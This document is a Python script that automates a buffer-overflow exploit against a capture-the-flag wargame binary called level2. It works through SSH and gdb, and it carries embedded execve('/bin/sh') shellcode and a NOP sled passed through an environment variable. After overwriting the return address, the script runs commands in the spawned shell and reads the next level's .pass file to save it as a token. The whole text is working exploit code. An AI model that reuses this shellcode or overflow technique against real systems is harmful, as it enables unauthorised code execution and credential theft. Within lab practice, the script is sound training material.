import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, upload_to
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

stream = exec_stream('./level2', title='Simple execute binary', stdin=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output)
print_title('Nothing happened')
print_title('Debug Time')

func_info = exec(client, 'echo "info func" | gdb ./level2 -q | egrep " p$| main$"', title='Get all functions')
print_output(func_info)
print_title('We have two entry points (main - 0x0804853f, p - 0x080484d4)')

main_structure = exec(client, 'echo "disass main" | gdb ./level2 -q', title='Get main structure')
print_output(main_structure)
print_title('Main call function `p`')

p_structure = exec(client, 'echo "disass p" | gdb ./level2 -q', title='Get P structure')
print_output(p_structure)
print_title('Read stdin and print it, check stack, if expression does not math, print address and exit')

ret_address = exec(client, 'echo "disass main" | gdb ./level2 -q | grep ret', title='Get main return address')
print_output(ret_address)
ret_address = ret_address[0].split(' ', 1)[0]
ret_address_transformed = address_to_string(ret_address)

env_variable = 'shell_code'
env_address = exec(
    client, f'echo "b *main\nr\nx/200xs environ" | {env_variable}="test" gdb ./level2 -q | grep {env_variable}',
    title=f'Get env {env_variable} address')
print_output(env_address)
env_address = env_address[0].split(':')[0]
env_address_transformed = address_to_string(env_address)

script = f'print "." * 80 + "{ret_address_transformed}" + "{env_address_transformed}"'
stream = exec(
    client, f"python -c '{script}' > /tmp/trick",
    title='Write trick file to overflow buffer (return adddress + env address)')

script = 'print "\\x90" * 1000 + "\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89' \
         '\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xcd' \
         '\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"'
f = lambda command: f"export {env_variable}=$(python -c '{script}') && echo '{command}' | cat /tmp/trick - | ./level2"

output = exec(
    client, f("whoami"),
    title='Export shellcode to env, it helps execute /bin/sh after overflow buffer via cat by our trick file')
print_output(output, 'Current user')
print_title('Got it! Check the password!')

token = exec(client, f("cat /home/user/level3/.pass"), title='Read .pass file')

save_token(token)



